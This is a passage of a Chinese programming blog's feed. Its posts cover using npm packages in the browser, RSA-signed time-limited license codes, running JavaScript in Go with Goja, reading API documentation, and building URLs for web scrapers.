class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Css Selector 转 XPath<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"bundle.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Css Selector转XPath<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"selector"</span> <span class="attr">style</span>=<span class="string">"width: 500px"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"translate"</span> <span class="attr">x-on:click</span>=<span class="string">"translate(selector)"</span>&gt;</span>转换<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h4</span>&gt;</span>转换结果：<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"result"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'.translate'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            selector = $(<span class="string">'.selector'</span>).val()</span></span><br><span class="line"><span class="javascript">            result = <span class="built_in">window</span>.cssxpath(selector)</span></span><br><span class="line"><span class="javascript">            $(<span class="string">'.result'</span>).text(result)</span></span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220216192731.png" alt=""></p><p>在<code>main.js</code>中，我们定义了<code>window.cssxpath = cssxpath</code>，所以，在HTML代码里面，我们就可以通过<code>window.cssxpath(selector)</code>来使用它了。</p></script></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们知道，Python的第三方库一般可以使用pip来安装。如果代码比较简单，我们甚至可以把第三方库的代码复制下来，放到项目里面导入。&lt;/p&gt;
&lt;p&gt;但由于JavaScript生态里面，有Node.js这个东西，这就导致第三方库有两种不同的导入方式。如果我们要做一个网站，我们通常会在HTML中，使用&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;标签引入.js文件，例如：&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样导入了.js文件以后，里面的代码在网页加载完成后就会运行。&lt;/p&gt;
&lt;p&gt;但在Node.js生态里面，第三方包一般需要使用&lt;code&gt;npm&lt;/code&gt;安装，然后在代码里面通过&lt;code&gt;require&lt;/code&gt;导入。最后再用webpack打包编译成能直接在浏览器中运行的JavaScript代码。&lt;/p&gt;
&lt;p&gt;如果我找到一个第三方的包，它只提供了npm版本，没有提供直接在浏览器中导入的版本怎么办？&lt;/p&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="https://www.kingname.info/categories/JavaScript/"/>
    
    
      <category term="JavaScript" scheme="https://www.kingname.info/tags/JavaScript/"/>
    
      <category term="Node.js" scheme="https://www.kingname.info/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>我做了一个App，如何让别人限时使用？</title>
    <link href="https://www.kingname.info/2022/03/06/limit-use-time/"/>
    <id>https://www.kingname.info/2022/03/06/limit-use-time/</id>
    <published>2022-03-06T15:14:45.000Z</published>
    <updated>2022-03-06T15:19:48.473Z</updated>
    
    <content type="html"><![CDATA[<p>假设有这样一个场景，你接了一个私活，帮别人做一个软件，软件没有联网功能。东西做好以后，客户还没有给钱，说要先试用一下。你选择了相信客户，把软件发送给了他。然后他就把你拉黑了。</p><a id="more"></a><p>为了避免这种情况发生，你首先想到的办法，肯定是把过期时间写死到代码里面，时间到了App自动销毁。对方付钱以后，你再把这个写死的时间延长或者去掉。再重新编译后发给客户。</p><p>但问题是，每次重新编译代码并发给用户是非常麻烦的事情，有没有更简单的办法呢？能不能软件始终是一个软件，但是给用户一个注册码，这个注册码里面标记了有效时间。等到过期以后，只需要给用户一个新的注册码，就可以继续使用了。</p><p>看到这里，有同学肯定会想，怎么在注册码指定有效期呢？首先这个时间肯定不能是明文的，否则用户把它一改，岂不是就可以自行延长了。</p><p>但如果加密的话，就必须把解密算法放到软件里面，一旦用户对程序进行初步的反编译，就能拿到解密算法或者对称加密的密钥。</p><p>因此，我们只能使用非对称加密。而非对称加密里面，通过公钥加密，使用私钥解密。如果我们要让软件从注册码里面解码出有效时间，难道要在软件里面放私钥？</p><p>私钥不能泄露，因此放到软件里面的只能是公钥。但是难道能使用私钥加密，用公钥解密？</p><p>实际上，真的可以这样做，但这不叫做私钥加密公钥解密，这叫做私钥签名(sign)，公钥验证(verify)。并且，使用这个方法有一个好处，就是有效时间可以直接明文存放，不怕用户修改。因为一旦修改了，签名就匹配不上。</p><p>假设我们有一个字符串<code>message</code>，使用私钥，可以对这个字符串进行签名，获得一个签名字符串<code>signature</code>。而我们用公钥，可以验证<code>message</code>是否能够生成签名字符串<code>signature</code>。如果<code>message</code>发生了修改，或者<code>signature</code>发生了修改，或者<code>message</code>和<code>signature</code>同时发生了修改，公钥验证都会失败。</p><p>各个语言都有非对称加密相关的第三方库。我们用Python中的<code>PyCryptodome</code>来进行演示。</p><p>首先，我们在macOS下面，生成一对公钥和私钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>根据提示输入密钥的储存路径就可以了，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220222182848.png" alt></p><p>在当前文件夹，生成了私钥<code>sign</code>和公钥<code>sign.pub</code>。</p><p>接下来，使用<code>pip</code>安装<code>PyCryptodome</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure><p>接下来，导入公钥和私钥：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> open(<span class="string">'sign'</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="meta">... </span> private = f.read()</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> open(<span class="string">'sign.pub'</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="meta">... </span> public = f.read()</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>private_key = RSA.import_key(private)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>public_key = RSA.import_key(public)</span><br></pre></td></tr></table></figure><p>由于我们之前生成密钥使用的是<code>SHA256</code>算法，因此我们需要用<code>SHA256</code>算法对需要签名的数据生成摘要。这一步在签名和验证签名的时候都需要做。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>digest = SHA256.new()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>message = <span class="string">'expire: 2022-03-01'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>digest.update(message.encode())</span><br></pre></td></tr></table></figure><p>接下来，对这个数据进行签名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>signer = PKCS1_v1_5.new(private_key)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>code = signer.sign(digest)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>signature = base64.b64encode(code)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(signature.decode())</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220222183837.png" alt></p><p>现在，你只需要把字符串<code>expire: 2022-03-01</code>和签名字符串<code>xbelbTNpq8M...很长一串...</code>发送给客户就可以了。</p><p>客户把过期时间的字符串和签名字符串输入到软件以后，软件使用公钥来验证这个字符串是不是由自己对应的私钥签名的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; message = &apos;expire: 2022-03-01&apos;</span><br><span class="line">&gt;&gt;&gt; signature = &apos;xbelbTNpq8MCFkSxGBoTq7SwQ+oqHRAObrj5p8K2gyY+7uWs5dXGjsQ+GP2XTS5YskCtGjYIBZmAmeM5ey69lRQyk5S1m7t68pYNbUvf3o39Ym0rcmK7XGkBh3euZzVeRErs4JCl7ffTbfcqM4aAsWldDKESrZvaDNQ5DkC8VRYHPBfZfScHqPw/zcHCMRhC9Dch8j9eQlnk8/UKY0MM92jXT4map94PzZRfMLkD4vsciZTtMJm4a42UiiWDUpA6zIgQCYru2YyKspS1uZFE51atYP5DcgPWvJUVRDJS/ZjdPfi9chRjx0dS/Df1sFEreZ7myzXAJP7Y8FA6rvi7EZLlHZ1ViM9tTJp9ut/ZlKgnPAuDCp1JSyKMUk/doVqzUjTqTNHuORe+p3Hhb+xkCASyD8eUH+CyEDVLRcDkSMH5U3o/uONnOQao2o9dbkGiSYNkToElQJ2v20S3MnncPciij8H7iI2dDp1dwt8bkcZOD+E1Tf88LMvRaxB7YnhJ&apos;</span><br><span class="line">&gt;&gt;&gt; digest = SHA256.new()</span><br><span class="line">&gt;&gt;&gt; digest.update(message.encode())</span><br><span class="line">&gt;&gt;&gt; reader = PKCS1_v1_5.new(public_key)</span><br><span class="line">&gt;&gt;&gt; reader.verify(digest, base64.b64decode(signature.encode()))</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>但如果你篡改了<code>message</code>的内容，那么验证就会失败，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220222192954.png" alt></p><p>软件第一次验证通过以后，就可以把这个过期时间的字符串和签名字符串一起用文件的形式存到硬盘上，每次启动软件的时候都检查一遍。发现合法并且没有过期就正常运行。发现过期了或者不合法就就重新弹出输入注册码的对话框。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;假设有这样一个场景，你接了一个私活，帮别人做一个软件，软件没有联网功能。东西做好以后，客户还没有给钱，说要先试用一下。你选择了相信客户，把软件发送给了他。然后他就把你拉黑了。&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://www.kingname.info/categories/Python/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：在 Golang 中运行 JavaScript</title>
    <link href="https://www.kingname.info/2022/01/18/run-js-in-golang/"/>
    <id>https://www.kingname.info/2022/01/18/run-js-in-golang/</id>
    <published>2022-01-18T13:07:01.000Z</published>
    <updated>2022-01-18T13:07:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，在 Python 里面，如果你要运行一段 JavaScript，你可以使用<code>execJS</code>这种第三方库。那么在 Golang 里面，你想运行 JavaScript 的时候又应该怎么办呢？</p><p>最近我发现一个使用 Golang 开发的 JavaScript 引擎：<a href="https://github.com/dop251/goja" target="_blank" rel="noopener">Goja</a>。它实现了<code>ES 5.1</code>的所有语法和大部分的<code>ES 6</code>语法，比 Python 的<code>execJS</code>要厉害得多。在一定程度上和特定场景下，它可以完全替代Chrome 的 V8引擎。</p><a id="more"></a><p>我们来看看如使用它运行一段 JavaScript 代码。首先，我来写一段递归版的 JavaScript 代码计算斐波那契数列：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fib</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n === <span class="number">1</span> || n === <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接在浏览器上面运行的效果如下：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220118194307.png" alt></p><p>现在，我们来安装这个<code>Goja</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/dop251/goja</span><br></pre></td></tr></table></figure><p>接下来我们在 Go 中运行 js 代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"github.com/dop251/goja"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> script = <span class="string">`</span></span><br><span class="line"><span class="string">    function fib(n) &#123;</span></span><br><span class="line"><span class="string">        if (n === 1 || n === 2) &#123;</span></span><br><span class="line"><span class="string">            return 1 </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return fib(n - 1) + fib(n - 2)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">    vm := goja.New()</span><br><span class="line">    _, err := vm.RunString(script)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"JS代码有问题！"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> fn <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">int32</span>)</span> <span class="title">int32</span></span></span><br><span class="line">    err = vm.ExportTo(vm.Get(<span class="string">"fib"</span>), &amp;fn)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"Js函数映射到 Go 函数失败！"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">"斐波那契数列第30项的值为："</span>, fn(<span class="number">30</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220118195256.png" alt></p><p>我们来解释一下上面代码的意思。请大家关注截图中的代码行号。第19行，我们创建了一个 JavaScript 的虚拟机。然后在第20行，把这个函数加载到了虚拟机当中。</p><p>第25行，我们创建了一个变量，这个变量是函数类型，这个函数接收一个 <code>int32</code>作为参数，并返回另一个<code>int32</code>类型的数据。</p><p>第26行，我们把 Golang 里面的这个函数变量与 JavaScript 里面的函数<code>fib</code>关联起来，这样我们就能直接写 Go 代码来调用 JavaScript 代码了。</p><p>第31行，我们像调用普通的 Go 函数一样传入参数，然后获得结果。</p><p>有一些同学在做爬虫的时候，需要运行一段 JavaScript 代码来生成一段 token，那你不妨试一试<code>Goja</code>，它的速度肯定要比你用Python 版本的快很多。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们知道，在 Python 里面，如果你要运行一段 JavaScript，你可以使用&lt;code&gt;execJS&lt;/code&gt;这种第三方库。那么在 Golang 里面，你想运行 JavaScript 的时候又应该怎么办呢？&lt;/p&gt;
&lt;p&gt;最近我发现一个使用 Golang 开发的 JavaScript 引擎：&lt;a href=&quot;https://github.com/dop251/goja&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Goja&lt;/a&gt;。它实现了&lt;code&gt;ES 5.1&lt;/code&gt;的所有语法和大部分的&lt;code&gt;ES 6&lt;/code&gt;语法，比 Python 的&lt;code&gt;execJS&lt;/code&gt;要厉害得多。在一定程度上和特定场景下，它可以完全替代Chrome 的 V8引擎。&lt;/p&gt;
    
    </summary>
    
      <category term="Golang" scheme="https://www.kingname.info/categories/Golang/"/>
    
    
      <category term="JavaScript" scheme="https://www.kingname.info/tags/JavaScript/"/>
    
      <category term="Golang" scheme="https://www.kingname.info/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：如何阅读技术文档（直播文案）</title>
    <link href="https://www.kingname.info/2022/01/18/how-to-read-doc/"/>
    <id>https://www.kingname.info/2022/01/18/how-to-read-doc/</id>
    <published>2022-01-18T13:05:46.000Z</published>
    <updated>2022-01-18T13:06:45.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> 今天这篇文章，是我今天（1月16日）知识星球直播的概要。详细内容，大家可以观看直播回放视频。已经在知识星球的同学，直接点击连接就能查看回放。尚未加入星球的同学，请在一周后，到我的B站上观看视频。</p></blockquote><a id="more"></a><p>我平常在公众号粉丝群里面常说，要多看官方文档，少看博客。有些同学就说，官方文档看不懂啊。例如你想学习Python的logging模块，然后你会看到<a href="https://docs.python.org/zh-cn/3/library/logging.html" target="_blank" rel="noopener">logging — Python 的日志记录工具 — Python 3.10.2 文档</a>是下面这样的：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220116174433.png" alt></p><p>又比如你想学习Golang里面<code>net/http</code>的使用，你会看到它的文档<a href="https://pkg.go.dev/net/http" target="_blank" rel="noopener">http package - net/http - pkg.go.dev</a>是这样的：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220116174611.png" alt></p><p>这样的文档，你看完以后，可能也写不出一个完整的可以运行的程序。但还有另一种文档，你就算第一次接触这个软件或者框架，你也能跟着它的指导写代码，例如Scrapy的官方教程<a href="https://docs.scrapy.org/en/latest/intro/tutorial.html" target="_blank" rel="noopener">Scrapy Tutorial — Scrapy 2.5.1 documentation</a>。你甚至不会英语也没关系，你就跟着黄绿背景的框框写命令，复制代码，你也可以把爬虫搞出来。</p><p>为什么会有这样的差异呢？因为我们平常笼统地叫做<code>文档</code>的东西，其实有两种。前两个反例是<code>API Reference</code>，API接口文档。Scrapy的叫做<code>教程</code>。API接口文档和教程文档是面向两种不同用途的。</p><p>Python的Logging模块也有教程文档版：<a href="https://docs.python.org/3/howto/logging.html#logging-howto" target="_blank" rel="noopener">Logging HOWTO</a>。</p><p>教程文档其实没有什么好说的，就是一步一步跟着走就能完成。教程文档会告诉你，<code>你不知道你不知道</code>的东西。</p><p>而API接口文档看起来就会比较费劲，因为它是用来告诉你<code>你知道你不知道</code>的东西。例如你知道有某个功能某个函数，但是你不知道它的具体语法怎么写，这个时候就用API接口文档。</p><p>在直播里面，我以Scrapy下载器中间件和Pyppeteer为例来进行说明。我知道下载器中间件怎么激活，我也知道我要修改代理IP，应该编写下载器中间件的<code>process_request</code>方法，但是这个方法接受哪些参数？它能返回什么东西？这个时候我就可以到API接口文档里面进行查询。</p><p>同理，在Pyppeteer的Github仓库里面，Readme写了两个简单的例子告诉我怎么使用它打开一个网页。但是我应该怎么使用XPath从页面上选中一个元素，然后点击它？这个时候就可以到API接口文档里面，搜索<code>xpath</code>，找到对应的方法，看它接受什么参数，返回什么内容，会报什么错。</p><p>直播的最后，我和大家一起试图从<code>net/http</code>的API文档里面寻找怎么更换代理IP。由于我用Go发起网络请求，主要是使用<code>imroc/req</code>，很少使用<code>net/http</code>，我处于<code>我不知道我不知道</code>的状态，于是我跟大家一起崩溃在了这个API接口文档里面。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt; 今天这篇文章，是我今天（1月16日）知识星球直播的概要。详细内容，大家可以观看直播回放视频。已经在知识星球的同学，直接点击连接就能查看回放。尚未加入星球的同学，请在一周后，到我的B站上观看视频。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="经验" scheme="https://www.kingname.info/categories/%E7%BB%8F%E9%AA%8C/"/>
    
    
      <category term="经验" scheme="https://www.kingname.info/tags/%E7%BB%8F%E9%AA%8C/"/>
    
      <category term="直播" scheme="https://www.kingname.info/tags/%E7%9B%B4%E6%92%AD/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：拼接个URL你也能搞错，还写个屁的爬虫。</title>
    <link href="https://www.kingname.info/2022/01/18/relative-url/"/>
    <id>https://www.kingname.info/2022/01/18/relative-url/</id>
    <published>2022-01-18T13:04:25.000Z</published>
    <updated>2022-01-18T13:05:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>在写爬虫的过程中，我们经常需要解析网站的列表页。</p><a id="more"></a><p>例如下面这个例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试相对路径<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>书籍列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://127.0.0.1:8000/book/1.html"</span>&gt;</span>第一本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://127.0.0.1:8000/book/2.html"</span>&gt;</span>第二本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://127.0.0.1:8000/book/3.html"</span>&gt;</span>第三本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://127.0.0.1:8000/book/4.html"</span>&gt;</span>第四本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://127.0.0.1:8000/book/5.html"</span>&gt;</span>第五本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107185621.png" alt></p><p>这种情况下，我想获取每一项的URL非常简单，直接写一个XPath就可以了，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107185741.png" alt></p><p>仔细观察你会发现，每一个连接的URL都是以<code>http://127.0.0.1:8000</code>开头的。而当前列表页的地址也是<code>http://127.0.0.1：8000</code>。所以为了简单起见，<code>&lt;a&gt;</code>标签里面可以使用相对路径：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 